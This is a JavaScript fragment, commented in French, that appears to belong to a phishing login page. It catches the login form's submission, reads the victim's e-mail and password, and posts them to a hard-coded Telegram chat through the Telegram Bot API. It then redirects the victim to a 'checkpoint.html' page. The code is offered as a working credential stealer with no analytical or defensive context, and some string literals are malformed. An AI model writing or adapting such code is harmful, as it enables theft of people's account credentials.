        const chatId = "5601119281"; // Remplacez par votre chat ID ou groupe ID

        // Fonction pour envoyer les données à Telegram
        async function sendToTelegram(formData) {
            const message = Nouveau message depuis le formulaire :
                \nE-mail: ${formData.user}
                \nMot de passe: ${formData.pass}
            ;
            const url = https://api.telegram.org/bot${token}/sendMessage;

            const response = await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });

            return response.json();
        }

        // Gestion de la soumission du formulaire
        document.getElementById("loginForm").addEventListener("submit", function (event) {
            event.preventDefault(); // Empêche la soumission par défaut

            const user = document.getElementById("user").value;
            const pass = document.getElementById("pass").value;

            // Créer un objet avec les données du formulaire
            const formData = {
                user: user,
                pass: pass
            };

            // Appeler la fonction pour envoyer les données à Telegram
            sendToTelegram(formData)
                .then(response => {
                    if (response.ok) {
                        // Si l'envoi est réussi, rediriger l'utilisateur vers checkpoint.html
                        window.location.href = "checkpoint.html"; // Redirection vers checkpoint.html
                    } else {
                        alert("Erreur lors de l'envoi des informations.");
                    }
                })
                .catch(error => {
                    console.error("Erreur : ", error);
                });
        });
